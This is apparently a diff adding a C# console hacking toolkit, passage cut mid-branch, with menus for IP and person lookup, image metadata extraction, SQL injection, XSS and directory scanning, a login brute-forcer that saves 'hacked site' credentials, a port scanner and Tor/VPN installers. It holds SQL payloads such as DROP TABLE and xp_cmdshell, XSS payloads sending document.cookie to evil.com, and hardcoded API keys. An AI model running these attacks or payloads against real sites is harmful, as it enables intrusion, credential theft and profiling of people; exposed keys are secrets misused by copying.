@@ -1,0 +1,1325 @@
+using System;
+using System.Net;
+using System.Net.Http;
+using System.Net.Sockets;
+using System.Text.RegularExpressions;
+using System.Threading;
+using System.Threading.Tasks;
+using Newtonsoft.Json;
+using Newtonsoft.Json.Linq;
+using System.IO;
+using System.Management;
+using System.Diagnostics;
+using System.Collections.Generic;
+using MetadataExtractor;
+using MetadataExtractor.Formats.Exif;
+using ipx_tool;
+
+
+namespace ipx_tool
+{
+    internal class Program
+    {
+        static async Task<bool> IsPortOpen(string host, int port, int timeout = 1000)
+        {
+            try
+            {
+                using (TcpClient client = new TcpClient())
+                {
+                    var connectionTask = client.ConnectAsync(host, port);
+                    var success = await Task.WhenAny(connectionTask, Task.Delay(timeout)) == connectionTask;
+
+                    return success && client.Connected;
+                }
+            }
+            catch (Exception)
+            {
+                return false;
+            }
+        }
+
+        static async Task ScanPorts(string host, int startPort, int endPort)
+        {
+            Console.WriteLine($"Scanning {host} for open ports...");
+            for (int port = startPort; port <= endPort; port++)
+            {
+                bool isOpen = await IsPortOpen(host, port);
+                if (isOpen)
+                {
+                    Console.WriteLine($"Port {port} is open.");
+                }
+                else
+                {
+                    Console.WriteLine($"Port {port} is closed.");
+                }
+            }
+        }
+
+        static string testLGPage = "https://localhost:7291/Account/Login";
+        static string projectpath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "IPXlogs");
+
+
+        static string Ipslogpath = Path.Combine(projectpath, "IP infos.txt");
+        static string ipslog = "";
+        static string personlogpath = Path.Combine(projectpath, "Personlogs.txt");
+        static string personlog = "";
+        static string Bruceforcelog = Path.Combine(projectpath, "Bruteforced.txt");
+        static string savedpass = "";
+        static string username = "";
+        static string[] pasword = { };
+        static string ipv4 = @"^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$";
+        static string person = @"^([A-Za-z]+)\s+([A-Za-z]+)\s+([A-Za-z]+)$";
+        static string ipv6 = @"^([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}$";
+        static string torExecutablePath = null;
+        static string vpnexefile = null;
+        static string[] TorPaths = new string[]
+                {
+            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "Tor Browser", "Browser", "firefox.exe"),
+            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "Tor Browser", "Browser", "firefox.exe"),
+            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Tor Browser", "Browser", "firefox.exe"),
+            @"C:\Users\" + Environment.UserName + @"\Desktop\Tor Browser\Browser\firefox.exe",
+            @"C:\Users\" + Environment.UserName + @"\Downloads\Tor Browser\Browser\firefox.exe"
+                };
+
+        static string[] VPNPaths = new string[]
+{
+    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "ProtonVPN_v3.4.3_x64", "ProtonVPN_v3.4.3_x64.exe"),
+    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "ProtonVPN_v3.4.3_x64", "ProtonVPN_v3.4.3_x64.exe"),
+    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "ProtonVPN_v3.4.3_x64", "ProtonVPN_v3.4.3_x64.exe"),
+    @"C:\Users\" + Environment.UserName + @"\Desktop\ProtonVPN_v3.4.3_x64\ProtonVPN_v3.4.3_x64.exe",
+    @"C:\Users\" + Environment.UserName + @"\Downloads\ProtonVPN_v3.4.3_x64\ProtonVPN_v3.4.3_x64.exe"
+};
+
+
+
+        static async Task Main(string[] args)
+        {
+            if (!System.IO.Directory.Exists(projectpath))
+            {
+                System.IO.Directory.CreateDirectory(projectpath);
+            }
+
+            string apiKey = "d536228f24a1fe";
+
+            string ApiKeyGoogle = "AIzaSyBl-7STP45strbHqu8yAg4zGkI3yD-jLH4";
+
+            string EngineId = "41335839fa2864e73";
+            Console.WriteLine(@"
+");
+            Thread.Sleep(700);
+            displaymain();
+
+            while(true)
+            {
+                var selected_option = Console.ReadLine();
+
+                if (selected_option == "1")
+                {
+                    Console.Clear();
+                    Console.ForegroundColor = ConsoleColor.Green;
+                    Console.WriteLine(@"
+┌─────────────────────────────────────────────┐
+│                                             │
+│    ██████╗ ███████╗██╗███╗   ██╗████████╗   │
+│   ██╔═══██╗██╔════╝██║████╗  ██║╚══██╔══╝   │
+│   ██║   ██║███████╗██║██╔██╗ ██║   ██║      │
+│   ██║   ██║╚════██║██║██║╚██╗██║   ██║      │
+│   ╚██████╔╝███████║██║██║ ╚████║   ██║      │
+│    ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝   ╚═╝      │
+│                                             │   
+│─────────────────────────────────────────────│
+│ 1) Ip                                       │
+│ 2) Person                                   │
+│ 3) Metadata Image Extraction                │
+└─────────────────────────────────────────────┘");
+                    string volba = Console.ReadLine();
+                    if (volba == "1")
+                    {
+                        Console.Clear();
+                        Console.WriteLine("IP:");
+                        Console.ResetColor();
+                        string targetip = Console.ReadLine();
+                        if (Regex.IsMatch(targetip, ipv4) || Regex.IsMatch(targetip, ipv6))
+                        {
+                            string url = $"http://ipinfo.io/{targetip}/json?token={apiKey}";
+
+                            using (HttpClient client = new HttpClient())
+                            {
+                                try
+                                {
+
+                                    string response = await client.GetStringAsync(url);
+                                    var ipData = JsonConvert.DeserializeObject<IpInfo>(response);
+
+                                    string mapurl = $"https://www.openstreetmap.org/?mlat={ipData.Loc.Split(',')[0]}&mlon={ipData.Loc.Split(',')[1]}#map=15/{ipData.Loc.Split(',')[0]}/{ipData.Loc.Split(',')[1]}";
+
+                                    Console.Clear();
+                                    ipslog = $@"
+IP: {ipData.Ip}
+
+{await CheckIfBot(targetip)}
+
+Location: {ipData.City}, {ipData.Region}, {ipData.Country}
+
+Map: {mapurl}
+
+Organization: {ipData.Org}";
+                                    Console.WriteLine(ipslog);
+                                }
+                                catch (Exception ex)
+                                {
+                                    Console.WriteLine("shit a error happaned: " + ex.Message);
+                                }
+                            }
+                            Console.ForegroundColor = ConsoleColor.Green;
+                            Console.WriteLine("\nPress any key to go back or press s to save it");
+                            ConsoleKeyInfo keyInfo = Console.ReadKey(true);
+                            if (keyInfo.Key == ConsoleKey.S)
+                            {
+                                savelog(ipslog, Ipslogpath, true);
+                                Thread.Sleep(500);
+                                displaymain();
+                            }
+                            else
+                            {
+                                displaymain();
+                            }
+
+
+                        }
+                        else
+                        {
+                            Console.WriteLine("Invalid format"); Thread.Sleep(1000);
+                            displaymain();
+                        }
+                    }
+                    else if (volba == "2")
+                    {
+                        Console.ForegroundColor = ConsoleColor.Green;
+                        Console.Clear();
+                        Console.WriteLine("enter pattern like this: name lastname city");
+                        Console.ResetColor();
+                        string query = Console.ReadLine();
+                        if (Regex.IsMatch(query, person))
+                        {
+                            Console.Clear();
+                            string apiUrl = $"https://www.googleapis.com/customsearch/v1?q={query}&key={ApiKeyGoogle}&cx={EngineId}";
+
+                            using (HttpClient client = new HttpClient())
+                            {
+
+                                HttpResponseMessage response = await client.GetAsync(apiUrl);
+
+
+                                if (response.IsSuccessStatusCode)
+                                {
+
+                                    string jsonResponse = await response.Content.ReadAsStringAsync();
+
+
+                                    JObject json = JObject.Parse(jsonResponse);
+
+
+                                    var items = json["items"];
+
+
+                                    foreach (var item in items)
+                                    {
+
+
+                                        string title = item["title"].ToString();
+                                        string link = item["link"].ToString();
+                                        string snippet = item["snippet"].ToString();
+
+                                        personlog = $@"/---------------------------------------------------\
+Who: {query}
+Title: {title}
+Link: {link}
+Description: {snippet}
+---------------------------------------------------";
+                                        Console.WriteLine(personlog);
+                                    }
+                                }
+                                else
+                                {
+
+                                    Console.WriteLine("Failed to fetch data.");
+                                    Thread.Sleep(500);
+                                }
+                                Console.ForegroundColor = ConsoleColor.Green;
+                                Console.WriteLine("\nPress any key to go back or press s to save it");
+                                ConsoleKeyInfo keyInfo = Console.ReadKey(true);
+                                if (keyInfo.Key == ConsoleKey.S)
+                                {
+                                    savelog($"who: {query}", personlogpath, false);
+                                    string jsonResponse = await response.Content.ReadAsStringAsync();
+
+
+                                    JObject json = JObject.Parse(jsonResponse);
+
+                                    var items = json["items"];
+                                    foreach (var item in items)
+                                    {
+
+
+                                        string title = item["title"].ToString();
+                                        string link = item["link"].ToString();
+                                        string snippet = item["snippet"].ToString();
+
+                                        personlog = $@"/---------------------------------------------------\
+Who: {query}
+Title: {title}
+Link: {link}
+Description: {snippet}
+---------------------------------------------------";
+                                        savelog(personlog, personlogpath, false);
+                                    }
+                                    Thread.Sleep(4000);
+                                    displaymain();
+                                }
+                                else
+                                {
+                                    displaymain();
+                                }
+
+                            }
+                        }
+                        else
+                        {
+                            Console.WriteLine("wrong pattern try again");
+                            Thread.Sleep(500);
+                            displaymain();
+                        }
+                    }
+                    else if (volba == "3")
+                    {
+                        Console.Clear();
+                        Console.WriteLine("Image Path:");
+                        string filePath = Console.ReadLine();
+
+                        if (!File.Exists(filePath))
+                        {
+                            Console.WriteLine("File does not exist. Please check the path.");
+                            Thread.Sleep(500);
+                            displaymain();
+                            
+                        }
+
+                        try
+                        {
+                            
+                            var directories = ImageMetadataReader.ReadMetadata(filePath);
+
+                            foreach (MetadataExtractor.Directory directory in directories)
+                            {
+                                foreach (var tag in directory.Tags)
+                                {
+                                    Console.WriteLine($"{directory.Name} - {tag.Name}: {tag.Description}");
+                                }
+                            }
+                                  
+                            Console.WriteLine("\nMetadata extraction complete.");
+                            Console.WriteLine("press any key to exit");
+                            Console.ReadKey();
+                            displaymain();
+                        }
+                        catch (Exception ex)
+                        {
+                            Console.WriteLine($"Error extracting metadata: {ex.Message}");
+
+                        }
+                    }
+                    else
+                    {
+                        Console.Clear();
+                        Console.WriteLine("wrong option");
+                        Thread.Sleep(300);
+                        displaymain();
+
+                     }
+                }
+                if (selected_option == "2")
+                {
+                    string[] sqlPayloads = { "' OR 1=1 --", "'; DROP TABLE users; --", "' OR 'a'='a", "' OR 1=1#", "' AND 1=1 --", "' AND 1=2 --", "'; --", "' UNION SELECT NULL, NULL, NULL --", "' UNION SELECT 1, 2, 3, 4 --", "' UNION SELECT username, password FROM users --", "' OR EXISTS(SELECT * FROM users WHERE username = 'admin') --", "' HAVING 1=1 --", "' AND username IS NULL --", "'; EXEC xp_cmdshell('dir') --", "'; EXECUTE IMMEDIATE 'DROP TABLE users' --", "' AND (SELECT COUNT(*) FROM information_schema.tables) > 1 --", "' AND (SELECT COUNT(*) FROM users WHERE username='admin') > 0 --", "' OR 1=1#' --", "'; SELECT * FROM users --", "'; SELECT table_name FROM information_schema.tables --", "'; SELECT column_name FROM information_schema.columns WHERE table_name='users' --", "' AND 'a' = 'a' --", "' AND NOT 1=2 --", "'; SHOW TABLES --", "'; SHOW COLUMNS FROM users --", "'; SELECT version() --", "'; SELECT DATABASE() --", "'; SELECT @@version --", "'; SELECT user() --", "'; SET GLOBAL log_bin = 1 --", "'; EXEC sp_configure 'show advanced options', 1 --", "'; EXEC xp_regread 'HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' --" };
+                    string[] commonPaths = { "admin", "administrator", "login", "admin/login", "controlpanel", "dashboard", "config", "configuration", "settings", "manage", "management", "backup", "db_backup", "backups", "old", "debug", "test", "testing", "dev", "development", "api", "rest", "v1", "v2", "system", "sysadmin", "webservice", "services", "uploads", "upload", "files", "documents", "downloads", "attachments", "assets", "logs", "log", "tmp", "temp", "cache", "errors", "wp-admin", "wp-content", "wp-includes", "administrator", "joomla", "user", "node", "data", "database", "sql", "db", "db_dump", "secrets", "keys", "private", "secure", "passwords", "checkout", "cart", "order", "payment", "invoice", "shop", "store", "docs", "documentation", "swagger", "openapi", "api-docs", "help", ".git", ".svn", ".hg", ".htaccess", ".env", "cgi-bin", "server-status", "nginx-status", "_vti_bin", "iisstart.htm", "phpmyadmin", "adminpanel", "shell", "cmd", "remote", "root", "cgi", "hidden", "private", "analytics", "wp-admin", "wp-content", "wp-includes" };
+                    string[] xssPayloads = { "<script>alert('XSS')</script>", "<img src='x' onerror='alert(1)'>", "<script>document.location='http://evil.com?cookie=' + document.cookie</script>", "<svg/onload=alert('XSS')>", "<iframe src='javascript:alert(1)'></iframe>", "<script src='http://evil.com/xss.js'></script>", "<body onload=alert(1)>", "<input type='text' value='<script>alert(1)</script>'>", "<div onclick='alert(1)'>Click me</div>", "<a href='javascript:alert(1)'>Click here</a>", "<script>eval('alert(1)')</script>", "<a href='javascript:confirm(1)'>Click here</a>", "<script>setTimeout(function(){alert(1)}, 100)</script>", "<script>fetch('http://evil.com?cookie=' + document.cookie)</script>", "<svg/onload=fetch('http://evil.com?cookie=' + document.cookie)>", "<script>window.location='http://evil.com?cookie=' + document.cookie</script>", "<script>document.cookie='XSS=true';</script>", "<script>alert('XSS');</script>" };
+
+                    Console.ForegroundColor = ConsoleColor.White;
+                    Console.Clear();
+                    Console.WriteLine(@$"
++=============================================================================+
+|                                                                             |
+|                                                                             |
+|    ___       __   _______   ________                                        |
+|   |\  \     |\  \|\  ___ \ |\   __  \                                       |
+|   \ \  \    \ \  \ \   __/|\ \  \|\ /_                                      |
+|    \ \  \  __\ \  \ \  \_|/_\ \   __  \                                     |
+|     \ \  \|\__\_\  \ \  \_|\ \ \  \|\  \                                    |
+|      \ \____________\ \_______\ \_______\                                   |
+|       \|____________|\|_______|\|_______|                                   |
+|                                                                             |
+|                                                                             |
+|                                                                             |
+|    ___  ___  ________  ________  ___  __    ___  ________   ________        |
+|   |\  \|\  \|\   __  \|\   ____\|\  \|\  \ |\  \|\   ___  \|\   ____\       |
+|   \ \  \\\  \ \  \|\  \ \  \___|\ \  \/  /|\ \  \ \  \\ \  \ \  \___|       |
+|    \ \   __  \ \   __  \ \  \    \ \   ___  \ \  \ \  \\ \  \ \  \  ___     |
+|     \ \  \ \  \ \  \ \  \ \  \____\ \  \\ \  \ \  \ \  \\ \  \ \  \|\  \    |
+|      \ \__\ \__\ \__\ \__\ \_______\ \__\\ \__\ \__\ \__\\ \__\ \_______\   |
+|       \|__|\|__|\|__|\|__|\|_______|\|__| \|__|\|__|\|__| \|__|\|_______|   |
+|                                                                             |
+|                                                                             |
++=============================================================================+
+|   1) web vurnebility scanning                                               |
+|   2) brute force                                                            |
++=============================================================================+");
+                    string volba = Console.ReadLine();
+                    if (volba == "1")
+                    {
+                        HttpClient client = new HttpClient();
+                        Console.Clear();
+                        Console.WriteLine(@"
+/----------------------------\
+1) SQL Injection Testing
+2) Directory Testing
+3) XSS Detection
+\----------------------------/");
+                        string volba2 = Console.ReadLine();
+                        if (volba2 == "1")
+                        {
+                            Console.Clear();
+                            Console.WriteLine("Url:(http://example.com/login)");
+                            string url = Console.ReadLine();
+                            foreach (var payload in sqlPayloads)
+                            {
+                                var content = new FormUrlEncodedContent(new[]
+                            {
+                new KeyValuePair<string, string>("username", payload),
+                new KeyValuePair<string, string>("password", "password")
+                            });
+
+                                var response = await client.PostAsync(url, content);
+                                string responseBody = await response.Content.ReadAsStringAsync();
+
+                                if (responseBody.Contains("Welcome") || responseBody.Contains("error"))
+                                {
+                                    Console.WriteLine($"Potential SQL Injection Detected with payload: {payload}");
+                                }
+                                else
+                                {
+                                    Console.WriteLine($"No SQL Detected with payload: {payload} :[");
+                                }
+                            }
+                            Console.WriteLine("\nPress any key to go back");
+                            Console.ReadKey();
+                            displaymain();
+
+                        }
+                        else if (volba2 == "2")
+                        {
+                            Console.Clear();
+                            Console.WriteLine("Url:(http://example.com/)");
+                            string url = Console.ReadLine();
+                            if (!url.EndsWith("/"))
+                            {
+                                url += "/";
+                            }
+
+                            foreach (var path in commonPaths)
+                            {
+                                var response = await client.GetAsync($"{url}{path}");
+
+                                if (response.StatusCode == HttpStatusCode.OK)
+                                {
+                                    Console.WriteLine($"Found directory: {path}");
+                                }
+                                else if (response.StatusCode == HttpStatusCode.Forbidden)
+                                {
+                                    Console.WriteLine($"Forbidden directory (restricted access): {path}");
+                                }
+                                else
+                                {
+                                    Console.WriteLine($"No directory found at: {path} :[");
+                                }
+                            }
+                            Console.WriteLine("\nPress any key to go back");
+                            Console.ReadKey();
+                            displaymain();
+
+                        }
+                        else if (volba2 == "3")
+                        {
+                            Console.Clear();
+                            Console.WriteLine("Url:(http://example.com/search)");
+                            string url = Console.ReadLine();
+
+                            foreach (var payload in xssPayloads)
+                            {
+                                var response = await client.GetAsync($"{url}?q={Uri.EscapeDataString(payload)}");
+                                string responseBody = await response.Content.ReadAsStringAsync();
+
+                                if (responseBody.Contains(payload))
+                                {
+                                    Console.WriteLine($"Potential XSS Vulnerability Detected with payload: {payload}");
+
+                                }
+                                else
+                                {
+                                    Console.WriteLine($"No XSS attack found with payload: {payload} :[");
+                                }
+
+                            }
+                            Console.WriteLine("\nPress any key to go back");
+                            Console.ReadKey();
+                            displaymain();
+
+
+                        }
+
+                    }
+                    
+
+                    if (volba == "2")
+                    {
+                        Console.Clear();
+
+
+
+                        Console.ForegroundColor = ConsoleColor.DarkRed;
+                        Console.Write(@"
+╔────────────────────────────────────────────────────────────────────────────────────────────╗
+│                                                                                            │
+│    ▄▄▄▄    ██▀███   █    ██ ▄▄▄█████▓▓█████      █████▒▒█████   ██▀███   ▄████▄  ▓█████    │
+│   ▓█████▄ ▓██ ▒ ██▒ ██  ▓██▒▓  ██▒ ▓▒▓█   ▀    ▓██   ▒▒██▒  ██▒▓██ ▒ ██▒▒██▀ ▀█  ▓█   ▀    │
+│   ▒██▒ ▄██▓██ ░▄█ ▒▓██  ▒██░▒ ▓██░ ▒░▒███      ▒████ ░▒██░  ██▒▓██ ░▄█ ▒▒▓█    ▄ ▒███      │
+│   ▒██░█▀  ▒██▀▀█▄  ▓▓█  ░██░░ ▓██▓ ░ ▒▓█  ▄    ░▓█▒  ░▒██   ██░▒██▀▀█▄  ▒▓▓▄ ▄██▒▒▓█  ▄    │
+│   ░▓█  ▀█▓░██▓ ▒██▒▒▒█████▓   ▒██▒ ░ ░▒████▒   ░▒█░   ░ ████▓▒░░██▓ ▒██▒▒ ▓███▀ ░░▒████▒   │
+│   ░▒▓███▀▒░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒   ▒ ░░   ░░ ▒░ ░    ▒ ░   ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░ ░▒ ▒  ░░░ ▒░ ░   │
+│   ▒░▒   ░   ░▒ ░ ▒░░░▒░ ░ ░     ░     ░ ░  ░    ░       ░ ▒ ▒░   ░▒ ░ ▒░  ░  ▒    ░ ░  ░   │
+│    ░    ░   ░░   ░  ░░░ ░ ░   ░         ░       ░ ░   ░ ░ ░ ▒    ░░   ░ ░           ░      │
+│    ░         ░        ░                 ░  ░              ░ ░     ░     ░ ░         ░  ░   │
+│         ░                                                               ░                  │
+│                                                                                            │
+│                                                                                            │
+│   1)test login page                                                                        │
+│                                                                                            │
+│                                                                                            │
+╚────────────────────────────────────────────────────────────────────────────────────────────╝
+");
+
+                        volba = Console.ReadLine();
+                        if (volba == "1")
+                        {
+
+                            if (pasword.Length > 0)
+                            {
+                                Console.Clear();
+                                Console.WriteLine($"testing brute force on {testLGPage}");
+
+                                string loginUrl = "https://localhost:7291/Account/Login";
+
+
+                                username = "admin";
+
+
+
+                                HttpClient client = new HttpClient();
+
+                                try
+                                {
+                                    foreach (string password in pasword)
+                                    {
+
+                                        Console.WriteLine($"Trying password: {password}");
+
+
+                                        var postData = new FormUrlEncodedContent(new[]
+                                        {
+                    new KeyValuePair<string, string>("username", username),
+                    new KeyValuePair<string, string>("password", password)});
+
+                                        try
+                                        {
+
+                                            HttpResponseMessage response = await client.PostAsync(loginUrl, postData);
+
+
+                                            string responseContent = await response.Content.ReadAsStringAsync();
+
+
+                                            Console.WriteLine($"Response: {response.StatusCode} - {responseContent.Substring(0, Math.Min(responseContent.Length, 500))}");
+
+
+                                            if (response.IsSuccessStatusCode && !responseContent.Contains("Invalid credentials"))
+                                            {
+
+                                                Console.WriteLine($"Login successful! Username: {username}, Password: {password}");
+                                                savedpass = password;
+                                                break;
+                                            }
+                                            else
+                                            {
+                                                Console.WriteLine($"Login failed for password: {password}");
+                                            }
+                                        }
+                                        catch (Exception ex)
+                                        {
+                                            Console.WriteLine($"Error occurred: {ex.Message}");
+                                        }
+                                    }
+
+                                    Console.WriteLine("Brute force attack complete.");
+                                }
+                                finally
+                                {
+                                    client.Dispose();
+                                }
+                                Console.WriteLine("\npress any key to exit or S to save it");
+                                ConsoleKeyInfo keyInfo = Console.ReadKey(true);
+                                if (keyInfo.Key == ConsoleKey.S)
+                                {
+                                    savelog($@"
+
+hacked site:{loginUrl}
+Username>{username} Password>{savedpass}", Bruceforcelog, false);
+
+
+
+
+
+
+                                    Thread.Sleep(4000);
+                                    displaymain();
+                                }
+                                else
+                                {
+                                    displaymain();
+                                }
+
+                            }
+                            else
+                            {
+                                Console.WriteLine("first add ur password list in 6) option");
+                                Thread.Sleep(1000);
+                                displaymain();
+                            }
+
+                        }
+                    }
+                    else
+                    {
+                        Console.WriteLine("Wrong option");
+                        Thread.Sleep(500);
+                        displaymain();
+                    }
+                }
+
+
+                else if (selected_option == "3")
+                {
+                    Console.ForegroundColor = ConsoleColor.Blue;
+                    Console.Clear();
+                    Console.WriteLine(@"
++------------------------------------------------------------------+
+|                                                                  |
+|                                                                  |
+|  ███╗   ██╗███████╗████████╗██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗  |
+|  ████╗  ██║██╔════╝╚══██╔══╝██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝  |
+|  ██╔██╗ ██║█████╗     ██║   ██║ █╗ ██║██║   ██║██████╔╝█████╔╝   |
+|  ██║╚██╗██║██╔══╝     ██║   ██║███╗██║██║   ██║██╔══██╗██╔═██╗   |
+|  ██║ ╚████║███████╗   ██║   ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗  |
+|  ╚═╝  ╚═══╝╚══════╝   ╚═╝    ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝  |
+|                                                                  |
+|  ██╗  ██╗ █████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗           |
+|  ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝           |
+|  ███████║███████║██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗          |
+|  ██╔══██║██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║          |
+|  ██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝          |
+|  ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝           |
+|                                                                  |
+|                                                                  |
++------------------------------------------------------------------+
+| 1) Port Scanning                                                 |
+| 2)                                                               |
+|                                                                  |
++------------------------------------------------------------------+");
+                    string volba = Console.ReadLine();
+                    if (volba == "1")
+                    {
+                        string portPattern = @"^(0|[1-9][0-9]{0,4})$";
+
+                        Console.Clear();
+
+                        Console.WriteLine("IP:");
+                        string targetHost = Console.ReadLine();
+                        if (Regex.IsMatch(targetHost, ipv4) || Regex.IsMatch(targetHost, ipv6))
+                        {
+                            Console.WriteLine("Starting port:");
+                            string entered = Console.ReadLine();
+                            if (Regex.IsMatch(entered, portPattern))
+                            {
+                                int startPort = int.Parse(entered);
+                                Console.WriteLine("Ending port:");
+                                entered = Console.ReadLine();
+                                if (Regex.IsMatch(entered, portPattern))
+                                {
+                                    int endPort = int.Parse(entered);
+                                    await ScanPorts(targetHost, startPort, endPort);
+
+                                    Console.WriteLine("Scan completed. click any button to exit");
+
+                                    Console.ReadKey();
+                                    displaymain();
+                                }
+                                else
+                                {
+                                    Console.WriteLine("\nThis is not a valid port");
+                                    Thread.Sleep(400);
+                                    displaymain();
+                                }
+
+                            }
+                            else
+                            {
+                                Console.WriteLine("\nThis is not a valid port");
+                                Thread.Sleep(400);
+                                displaymain();
+                            }
+                        }
+                        else
+                        {
+                            Console.WriteLine("\nHey this is not Ip Adress");
+                            Thread.Sleep(400);
+                            displaymain();
+
+                        }
+                    }
+                    else
+                    {
+                        Console.WriteLine("Wrong option");
+                        Thread.Sleep(400);
+                        displaymain();
+                    }
+
+                }
+
+
+                else if (selected_option == "4")
+                {
+
+                    Console.Clear();
+
+
+
+                    Console.ForegroundColor = ConsoleColor.Magenta;
+                    string TorUrl = "https://www.torproject.org/dist/torbrowser/14.0.2/tor-browser-windows-x86_64-portable-14.0.2.exe";
+
+                    string TOR = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+                    if (!System.IO.Directory.Exists(TOR))
+                    {
+                        System.IO.Directory.CreateDirectory(TOR);
+                    }
+                    string torpath = TOR;
+                    string installerpath = Path.Combine(torpath, "tor-browser-installer.exe");
+
+
+                    if (File.Exists(installerpath))
+                    {
+                        Console.WriteLine("Tor Browser installer is downloaded.");
+                        foreach (string path in TorPaths)
+                        {
+                            if (File.Exists(path))
+                            {
+                                torExecutablePath = path;
+                                break;
+                            }
+                        }
+
+                        ProcessStartInfo torProcessInfo = new ProcessStartInfo
+                        {
+                            FileName = torExecutablePath,
+                            UseShellExecute = true,
+                            CreateNoWindow = false,
+                            WindowStyle = ProcessWindowStyle.Normal
+                        };
+
+                        Process.Start(torProcessInfo);
+
+                    }
+                    else
+                    {
+                        Console.WriteLine("Tor Browser installer is not found. Please check the download path.");
+                        bool success = await TorInstaller(TorUrl, Path.Combine(torpath, "tor-browser-installer.exe"));
+                        if (success)
+                        {
+                            TorSoftware(installerpath);
+                        }
+                        else
+                        {
+                            Console.WriteLine("Installation failed due to download error.");
+                        }
+                    }
+                    Thread.Sleep(1000);
+                    displaymain();
+
+
+                }
+                else if (selected_option == "5")
+                {
+                    Console.Clear();
+                    Console.ForegroundColor = ConsoleColor.White;
+                    Console.WriteLine(@"
+
+   ________  ________  ________  _________  _______   ________ _________  ___  ___       
+  |\   __  \|\   __  \|\   __  \|\___   ___\\  ___ \ |\   ____\\___   ___\\  \|\  \      
+  \ \  \|\  \ \  \|\  \ \  \|\  \|___ \  \_\ \   __/|\ \  \___\|___ \  \_\ \  \ \  \     
+   \ \   ____\ \   _  _\ \  \\\  \   \ \  \ \ \  \_|/_\ \  \       \ \  \ \ \  \ \  \    
+    \ \  \___|\ \  \\  \\ \  \\\  \   \ \  \ \ \  \_|\ \ \  \____   \ \  \ \ \__\ \__\   
+     \ \__\    \ \__\\ _\\ \_______\   \ \__\ \ \_______\ \_______\  \ \__\ \|__|\|__|   
+      \|__|     \|__|\|__|\|_______|    \|__|  \|_______|\|_______|   \|__|     ___  ___ 
+                                                                               |\__\|\__\
+                                                                               \|__|\|__|
+
+
+   1)Install VPN
+                                                                                       
+                                                                                                  
+");
+                    string volba = Console.ReadLine();
+                    if (volba == "1")
+                    {
+                        Console.Clear();
+
+
+
+                        Console.ForegroundColor = ConsoleColor.Magenta;
+                        string VpnUrl = "https://vpn.protondownload.com/download/ProtonVPN_v3.4.3_x64.exe";
+
+                        string VPN = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+                        if (!System.IO.Directory.Exists(VPN))
+                        {
+                            System.IO.Directory.CreateDirectory(VPN);
+                        }
+                        string vpnpath = VPN;
+                        string installerpath = Path.Combine(vpnpath, "ProtonVPN_v3.4.3_x64.exe");
+
+
+                        if (File.Exists(installerpath))
+                        {
+                            Console.WriteLine("Vpn installer is downloaded.");
+                            foreach (string path in VPNPaths)
+                            {
+                                if (File.Exists(path))
+                                {
+                                    vpnexefile = path;
+                                    break;
+                                }
+                            }
+
+                            ProcessStartInfo VpnProccesInfo = new ProcessStartInfo
+                            {
+                                FileName = vpnexefile,
+                                UseShellExecute = true,
+                                CreateNoWindow = false,
+                                WindowStyle = ProcessWindowStyle.Normal
+                            };
+
+                            Process.Start(VpnProccesInfo);
+
+                        }
+                        else
+                        {
+                            Console.WriteLine("VPN installer is not found. Please check the download path.");
+                            bool success = await VPNInstall(VpnUrl, Path.Combine(vpnpath, "ProtonVPN_v3.4.3_x64.exe"));
+                            if (success)
+                            {
+                                VPNSoftware(installerpath);
+                            }
+                            else
+                            {
+                                Console.WriteLine("Installation failed due to download error.");
+                            }
+                        }
+                        Thread.Sleep(1000);
+                        displaymain();
+
+                    }
+                }    
+                else if (selected_option == "6")
+                {
+
+                    Console.Clear();
+
+                    Console.ForegroundColor = ConsoleColor.Blue;
+                    Console.WriteLine(@"
+╔════════════════════════════════════════════════════════════════╗     
+║    ▀▀▀▀▀▀  ▀▀▀▀▀   ▀       ▀▀▀▀▀▀▀                             ║
+║    ▀         ▀     ▀       ▀                                   ║
+║    ▀▀▀▀▀▀    ▀     ▀       ▀▀▀▀▀▀▀                             ║
+║    ▀         ▀     ▀       ▀                                   ║
+║    ▀       ▀▀▀▀▀   ▀▀▀▀▀   ▀▀▀▀▀▀▀                             ║
+╠════════════════════════════════════════════════════════════════╣
+║                        Log File Config                         ║
+╠════════════════════════════════════════════════════════════════╣
+║ 1) Open log File                                               ║
+║ 2) Delete all logs                                             ║
+║ 3) Add your password list                                      ║
+╠════════════════════════════════════════════════════════════════╣
+");
+                    Console.ResetColor();
+                    string LogOption = Console.ReadLine();
+                    Console.ForegroundColor = ConsoleColor.Blue;
+                    Console.Clear();
+                    if (LogOption == "1")
+                    {
+
+                        if (System.IO.Directory.Exists(projectpath))
+                        {
+
+                            Process.Start(projectpath);
+                            Console.WriteLine("File is now open.");
+                            Thread.Sleep(500);
+                            displaymain();
+                        }
+                        else
+                        {
+                            Console.WriteLine("bruh directory dosent exists");
+                            Thread.Sleep(500);
+                            displaymain();
+                        }
+                    }
+                    else if (LogOption == "2")
+                    {
